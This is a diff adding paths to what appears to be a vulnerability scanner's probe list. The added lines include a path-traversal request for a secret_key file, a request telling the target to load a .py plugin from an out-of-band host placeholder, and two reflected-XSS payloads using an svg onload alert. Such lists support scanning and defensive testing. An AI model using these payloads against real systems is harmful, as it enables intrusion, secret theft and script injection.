@@ -2231,3 +2231,12 @@
 /?rest_route=/wpgmza/v1/markers/1/
 /?rest_route=/wpgmza/v1/markers/2/
 /?rest_route=/wpgmza/v1/markers/3/
+/wp-content/plugins/everest-forms/readme.txt
+/rest/configure?plugins=http://{{interactsh-url}}/{{randstr}}.py
+/en/login
+/login.do
+/api/v1/files/profile_pictures/../secret_key
+/?PagePrincipale/revisions
+/?GererSite/revisions
+/?PagePrincipale&time={{url_encode(timestamp)}}%22%3E%3Csvg%20onload%3Dalert(document.domain)%3E
+/?GererSite&time={{url_encode(timestamp)}}%22%3E%3Csvg%20onload%3Dalert(document.domain)%3E
